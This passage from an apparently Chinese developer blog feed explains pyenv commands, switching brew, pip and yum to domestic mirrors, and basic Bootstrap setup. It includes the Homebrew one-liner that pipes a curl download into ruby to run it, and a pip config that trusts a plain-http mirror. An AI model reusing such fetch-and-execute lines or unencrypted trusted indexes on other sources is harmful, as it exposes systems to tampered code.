<h4 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h4><ul>
<li>pyenv version # 当前版本</li>
<li>pyenv versions # 所有版本</li>
<li>pyenv global system # 全局切换</li>
<li>pyenv local 2.7.10 # 本地切换</li>
<li>pyenv local 3.5.0 –unset # 取消切换</li>
</ul>
<p>pyenv常用命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ pyenv install --list <span class="comment">#列出可安装版本</span></div><div class="line">$ pyenv install &lt;version&gt; <span class="comment"># 安装对应版本</span></div><div class="line">$ pyenv versions <span class="comment"># 显示当前使用的python版本</span></div><div class="line">$ pyenv <span class="built_in">which</span> python <span class="comment"># 显示当前python安装路径</span></div><div class="line">$ pyenv global &lt;version&gt; <span class="comment"># 设置默认Python版本</span></div><div class="line">$ pyenv <span class="built_in">local</span> &lt;version&gt; <span class="comment"># 当前路径创建一个.python-version, 以后进入这个目录自动切换为该版本</span></div><div class="line">$ pyenv shell &lt;version&gt; <span class="comment"># 当前shell的session中启用某版本，优先级高于global 及 local</span></div></pre></td></tr></table></figure></p>
<p>安装其他版本python<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">pyenv install xx.xx.xx (pyenv install 3.4.3) <span class="comment">#安装python3.4.3</span></div><div class="line">pyenv <span class="built_in">rehash</span>   <span class="comment"># 安装完以后记得一定要rehash</span></div></pre></td></tr></table></figure></p>
<h3 id="virtualenv-or-pyenv"><a href="#virtualenv-or-pyenv" class="headerlink" title="virtualenv or pyenv ?"></a>virtualenv or pyenv ?</h3><p>如果是项目环境，建议virtualenv，环境独立，也不会有很大的Bug。<br>如果只是个人学习练习python，可以使用pyenv，切换方便。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;总有一条蜿蜒在童话镇里七彩的河&lt;/blockquote&gt;&lt;br&gt;　　有时候在安装python环境时会遇到一些奇葩的问题，比如有些包无论如何也安装不了，受限于python版本，有些环境部署实在麻烦。因此我建议使用虚拟环境来部署python，比如一个项目就单独建立一个python虚拟环境，与其他项目互不干扰。python虚拟环境工具很多，这里主要介绍virtualenv与pyenv。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="http://thief.one/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="python" scheme="http://thief.one/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Brew、Pip、Yum更换国内源</title>
    <link href="http://thief.one/2017/08/24/1/"/>
    <id>http://thief.one/2017/08/24/1/</id>
    <published>2017-08-24T06:41:28.000Z</published>
    <updated>2017-10-11T02:47:54.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">翻过人山人海</blockquote><br>　　brew与pip是mac上常用的两款包管理软件，可惜都是国外的产品，因此默认的源也是国外的，速度被墙卡了不少，因此需要更换成国内的源。yum是centos操作系统的包管理工具，默认的源也是国外的，速度比较慢。<br><a id="more"></a></p>
<h3 id="brew"><a href="#brew" class="headerlink" title="brew"></a>brew</h3><p>brew是mac上的包管理工具，类似于ubuntu上的apt-get，centos上的yum。</p>
<h4 id="安装brew"><a href="#安装brew" class="headerlink" title="安装brew"></a>安装brew</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -e <span class="string">"<span class="variable">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)</span>"</span></div></pre></td></tr></table></figure>
<h4 id="使用brew"><a href="#使用brew" class="headerlink" title="使用brew"></a>使用brew</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">brew install</div></pre></td></tr></table></figure>
<h4 id="更换源"><a href="#更换源" class="headerlink" title="更换源"></a>更换源</h4><p>brew默认的源速度太慢了，有时还会被墙……，可以替换成国内的源，这里演示的是中科大的源。</p>
<h5 id="替换brew-git"><a href="#替换brew-git" class="headerlink" title="替换brew.git"></a>替换brew.git</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$(brew --repo)</span>"</span></div><div class="line">git remote <span class="built_in">set</span>-url origin https://mirrors.ustc.edu.cn/brew.git</div></pre></td></tr></table></figure>
<h5 id="替换homebrew-core-git"><a href="#替换homebrew-core-git" class="headerlink" title="替换homebrew-core.git"></a>替换homebrew-core.git</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$(brew --repo)</span>/Library/Taps/homebrew/homebrew-core"</span></div><div class="line">git remote <span class="built_in">set</span>-url origin https://mirrors.ustc.edu.cn/homebrew-core.git</div></pre></td></tr></table></figure>
<h5 id="替换Homebrew-Bottles源"><a href="#替换Homebrew-Bottles源" class="headerlink" title="替换Homebrew Bottles源"></a>替换Homebrew Bottles源</h5><p>对于bash用户：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> <span class="string">'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles'</span> &gt;&gt; ~/.bash_profile</div><div class="line"><span class="built_in">source</span> ~/.bash_profile</div></pre></td></tr></table></figure></p>
<p>对于zsh用户：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> <span class="string">'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles'</span> &gt;&gt; ~/.zshrc</div><div class="line"><span class="built_in">source</span> ~/.zshrc</div></pre></td></tr></table></figure></p>
<p>说明：建议以上三个源都替换一下，然后brew update 更新一下。</p>
<h3 id="pip"><a href="#pip" class="headerlink" title="pip"></a>pip</h3><p>pip是python的包管理工具，类似node.js的npm管理工具。</p>
<h4 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install python-pip</div></pre></td></tr></table></figure>
<p>或者：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">wget <span class="string">"https://pypi.python.org/packages/source/p/pip/pip-1.5.4.tar.gz#md5=834b2904f92d46aaa333267fb1c922bb"</span></div><div class="line">解压以后，进入setuptools文件目录下运行sudo python setup.py install。</div><div class="line">然后进入pip文件目录下运行sudo python setup.py install。</div></pre></td></tr></table></figure></p>
<h4 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h4><ul>
<li>pip list  # 列出所有安装的库</li>
<li>pip list –outdated # 列出所有过期的库</li>
<li>pip install –upgrade 库名  # 更新库</li>
<li>pip install –upgrade pip  # 更新pip自身</li>
<li>pip freeze # 查看安装了哪些包</li>
<li>pip install -t /usr/local/lib/python2.7/site-packages/ xlrd # 给指定版本的python安装库</li>
<li>pip install jieba -i <a href="https://pypi.douban.com/simple" target="_blank" rel="external">https://pypi.douban.com/simple</a>  # 单次使用国内源安装</li>
</ul>
<h4 id="替换pip源"><a href="#替换pip源" class="headerlink" title="替换pip源"></a>替换pip源</h4><p>国外源的速度在国内下载实在太慢，因此需要更改镜像源，可以改成阿里云或者豆瓣的镜像。</p>
<h5 id="临时使用国内源"><a href="#临时使用国内源" class="headerlink" title="临时使用国内源"></a>临时使用国内源</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install jieba -i https://pypi.douban.com/simple  <span class="comment"># 单次使用国内源安装</span></div></pre></td></tr></table></figure>
<ul>
<li>阿里云 <a href="http://mirrors.aliyun.com/pypi/simple/" target="_blank" rel="external">http://mirrors.aliyun.com/pypi/simple/</a> </li>
<li>中国科技大学 <a href="https://pypi.mirrors.ustc.edu.cn/simple/" target="_blank" rel="external">https://pypi.mirrors.ustc.edu.cn/simple/</a> </li>
<li>豆瓣 <a href="http://pypi.douban.com/simple/" target="_blank" rel="external">http://pypi.douban.com/simple/</a> </li>
<li>清华大学 <a href="https://pypi.tuna.tsinghua.edu.cn/simple/" target="_blank" rel="external">https://pypi.tuna.tsinghua.edu.cn/simple/</a> </li>
<li>中国科学技术大学 <a href="http://pypi.mirrors.ustc.edu.cn/simple/" target="_blank" rel="external">http://pypi.mirrors.ustc.edu.cn/simple/</a></li>
</ul>
<h5 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h5><p>编辑pip.cofig文件，文件位置(若不存在则新建一个)：</p>
<ul>
<li>mac:~/.pip/pip.conf</li>
<li>linux:~/.pip/pip.conf</li>
<li>windows:%HOMEPATH%\pip\pip.ini</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[global]</div><div class="line">index-url=http://mirrors.aliyun.com/pypi/simple/</div><div class="line"></div><div class="line">[install]</div><div class="line">trusted-host=mirrors.aliyun.com</div></pre></td></tr></table></figure>
<p>保存退出即可。</p>
<h5 id="pip报错处理"><a href="#pip报错处理" class="headerlink" title="pip报错处理"></a>pip报错处理</h5><p>错误信息：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">OSError: [Errno 1] Operation not permitted:</div></pre></td></tr></table></figure></p>
<p>解决方案:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">pip install --upgrade pip</div><div class="line">sudo pip install numpy   --ignore-installed</div></pre></td></tr></table></figure></p>
<h3 id="yum"><a href="#yum" class="headerlink" title="yum"></a>yum</h3><h4 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h4><p>首先备份/etc/yum.repos.d/CentOS-Base.repo文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup</div></pre></td></tr></table></figure></p>
<h4 id="下载国内源文件"><a href="#下载国内源文件" class="headerlink" title="下载国内源文件"></a>下载国内源文件</h4><p>下载对应版本repo文件, 放入/etc/yum.repos.d/，比如网易源：</p>
<ul>
<li><a href="http://mirrors.163.com/.help/CentOS7-Base-163.repo" target="_blank" rel="external">CentOS7</a></li>
<li><a href="http://mirrors.163.com/.help/CentOS6-Base-163.repo" target="_blank" rel="external">CentOS6</a></li>
<li><a href="http://mirrors.163.com/.help/CentOS5-Base-163.repo" target="_blank" rel="external">CentOS5</a></li>
</ul>
<p>说明：也可以不用下载，通过修改CentOS-Base.repo文件中的源地址即可。</p>
<h4 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h4><p>运行以下命令生成缓存：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Yum clean all</div><div class="line">Yum makecache</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;翻过人山人海&lt;/blockquote&gt;&lt;br&gt;　　brew与pip是mac上常用的两款包管理软件，可惜都是国外的产品，因此默认的源也是国外的，速度被墙卡了不少，因此需要更换成国内的源。yum是centos操作系统的包管理工具，默认的源也是国外的，速度比较慢。&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="http://thief.one/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="Brew" scheme="http://thief.one/tags/Brew/"/>
    
      <category term="git" scheme="http://thief.one/tags/git/"/>
    
      <category term="yum" scheme="http://thief.one/tags/yum/"/>
    
  </entry>
  
  <entry>
    <title>bootstrap前端框架</title>
    <link href="http://thief.one/2017/08/23/1/"/>
    <id>http://thief.one/2017/08/23/1/</id>
    <published>2017-08-23T08:47:34.000Z</published>
    <updated>2017-08-23T09:13:09.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Let bygones be bygones<br>过去的就让它过去吧</blockquote><br>　　现在Web前端的技术发展得很快，web页面做得越来越炫目。然而作为一名”后端程序员”，不会写css，写不好javascript，不懂jquery怎么办？没关系，本篇将介绍前端开发神器–bootstrap，学会它立马变身前端达人。（题外话：我也是被前端开发搞得心力憔悴后，才发现有这个框架，用起来简直爽！）<br><a id="more"></a></p>
<h3 id="Who-is-bootstrap"><a href="#Who-is-bootstrap" class="headerlink" title="Who is bootstrap?"></a>Who is bootstrap?</h3><p>　　Bootstrap是由Twitter的Mark Otto和Jacob Thornton开发的，在2011年八月发布的开源产品。Bootstrap是一个用于快速开发Web应用程序和网站的前端框架，其基于 HTML、CSS、JAVASCRIPT。<br>　　简单来说，Bootstrap相当于一个封装好的前端模块，而模块中的方法（函数）涵盖了html、css、javascript，封装的功能包含常用的布局、颜色等，直接调用即可。</p>
<h3 id="How-to-install-bootstrap"><a href="#How-to-install-bootstrap" class="headerlink" title="How to install bootstrap?"></a>How to install bootstrap?</h3><h4 id="（一）官网下载编译好的压缩包"><a href="#（一）官网下载编译好的压缩包" class="headerlink" title="（一）官网下载编译好的压缩包"></a>（一）官网下载编译好的压缩包</h4><p>官网：<a href="http://getbootstrap.com/" target="_blank" rel="external">http://getbootstrap.com/</a><br>找到下图位置，并下载压缩包，解压后获取css与js文件夹。<br><img src="/upload_image/20170823/1.png" alt=""></p>
<h4 id="（二）Github源码下载"><a href="#（二）Github源码下载" class="headerlink" title="（二）Github源码下载"></a>（二）Github源码下载</h4><p>Github：<a href="https://github.com/twbs/bootstrap" target="_blank" rel="external">https://github.com/twbs/bootstrap</a><br>说明一下，官方也可以直接下载源码，下载后获取dist里面的css与js文件夹；当然也可以自己编译，参照github上面的教程</p>
<h4 id="（三）使用cdn文件"><a href="#（三）使用cdn文件" class="headerlink" title="（三）使用cdn文件"></a>（三）使用cdn文件</h4><p>简单来说，使用bootstrap主要就是使用已经封装好的js与css文件，因此也可以不用下载，直接使用官方提供的cdn文件，将以下代码添加到html的head中。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css"</span>&gt;  </div><div class="line">&lt;script src=<span class="string">"https://cdn.bootcss.com/jquery/2.1.1/jquery.min.js"</span>&gt;&lt;/script&gt;</div><div class="line">&lt;script src=<span class="string">"https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"</span>&gt;&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<h3 id="How-to-use-bootstrap"><a href="#How-to-use-bootstrap" class="headerlink" title="How to use bootstrap?"></a>How to use bootstrap?</h3><p>具体使用手册可以参考：<br><a href="http://www.runoob.com/bootstrap/bootstrap-tutorial.html" target="_blank" rel="external">http://www.runoob.com/bootstrap/bootstrap-tutorial.html</a><br><a href="http://www.bootcss.com/" target="_blank" rel="external">http://www.bootcss.com/</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">&lt;head&gt;</div><div class="line">  &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css"</span>&gt;  </div><div class="line">  &lt;script src=<span class="string">"https://cdn.bootcss.com/jquery/2.1.1/jquery.min.js"</span>&gt;&lt;/script&gt;</div><div class="line">  &lt;script src=<span class="string">"https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"</span>&gt;&lt;/script&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;table class=<span class="string">"table table-striped"</span>&gt; </div><div class="line">&lt;tr&gt;</div><div class="line">&lt;th&gt;<span class="built_in">test</span>&lt;/th&gt;</div><div class="line">&lt;th&gt;<span class="built_in">test</span>&lt;/th&gt;</div><div class="line">&lt;th&gt;<span class="built_in">test</span>&lt;/th&gt;</div><div class="line">&lt;/tr&gt;</div><div class="line">&lt;tr&gt;</div><div class="line">&lt;td&gt;<span class="built_in">test</span>&lt;/td&gt;</div><div class="line">&lt;td&gt;<span class="built_in">test</span>&lt;/td&gt;</div><div class="line">&lt;td&gt;<span class="built_in">test</span>&lt;/td&gt;</div><div class="line">&lt;/tr&gt;</div><div class="line">&lt;/table&gt;</div><div class="line">    &lt;button <span class="built_in">type</span>=<span class="string">"button"</span> class=<span class="string">"btn btn-success"</span>&gt;成功按钮&lt;/button&gt;</div><div class="line">&lt;/body&gt;</div></pre></td></tr></table></figure>
<p><img src="/upload_image/20170823/2.png" alt=""></p>
<p>说明：head中导入js与css，模版很多不过一般这三个就够用了，然后具体的标签中就可以使用class来加载css与js。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Let bygones be bygones&lt;br&gt;过去的就让它过去吧&lt;/blockquote&gt;&lt;br&gt;　　现在Web前端的技术发展得很快，web页面做得越来越炫目。然而作为一名”后端程序员”，不会写css，写不好javascript，不懂jquery怎么办？没关系，本篇将介绍前端开发神器–bootstrap，学会它立马变身前端达人。（题外话：我也是被前端开发搞得心力憔悴后，才发现有这个框架，用起来简直爽！）&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="http://thief.one/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="bootstrap" scheme="http://thief.one/tags/bootstrap/"/>
    
  </entry>
  
</feed>
